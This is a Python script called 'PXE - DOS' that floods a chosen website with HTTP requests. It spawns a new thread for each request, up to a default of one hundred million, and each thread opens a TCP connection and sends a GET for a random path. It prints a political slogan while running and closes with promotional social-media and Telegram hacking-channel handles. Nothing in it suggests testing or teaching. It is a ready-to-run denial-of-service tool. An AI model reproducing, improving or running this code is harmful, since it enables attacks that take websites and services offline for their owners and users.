import os
import random
import socket
import string
import sys
import threading
import time
import sys
from pyfiglet import Figlet
from termcolor import colored
xx = sys.version[:3]
x = ["3.8","3.7","3.9"]
if xx in x :
    pass
else:
    print("")
    print("")
    print("             #  run the program with python3  #   ")
    print("")
    print("")
    exit()



host = ""
ip = ""
port = 0
num_requests = 0

(os.system("clear"))
x = Figlet(font="standard")
print (colored(x.renderText("              PXE - DOS"),"red"))

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print (colored("   wrong:\n\n\n\ttype: " + sys.argv[0] + " < web side > < des port > < number of syn messages >\n\n","cyan"))
    sys.exit(1)


try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except :
    print ("  ERROR\n  Make sure you entered a correct website")
    sys.exit(2)


thread_num = 0
thread_num_mutex = threading.Lock()



def print_status():
    global thread_num
    try:
     thread_num_mutex.acquire(True)
    except:
      print("",end="")
    thread_num += 1
    print (colored("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "]" + " ip address  =  " + host +  " فلسطين_لن_تهود#","green"))

    try:
     thread_num_mutex.release()
    except:
      print("",end="")

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data



def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode()
        dos.send(byt)
    except :
        print (colored("\n < No connection, server may be down > " ,"cyan"))

    finally:
        try:
          dos.shutdown(socket.SHUT_RDWR)
        except:
          print("",end="")  
        dos.close()

print (colored("\n  PXE - DOS  started on  < "+ host + " >  < " + ip + " >   < Port: " + str(port) + " >   # Requests: " + str(num_requests),"cyan"))
# Spawn a thread per request
all_threads = []
try:
      for i in range(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)
        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)
except:
    print("",end="")
try:
 for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
except:
  print("",end='')
print("\n\n")
print (colored("          personal account    ==> t.me/HM_XHT         ","red"))
print (colored("          Telegram   ==> t.me/hacking_pro         ","red"))
print (colored("          insta    ==> instagram.com/al_ghonime   " ,"red"),end="\n\n\n")



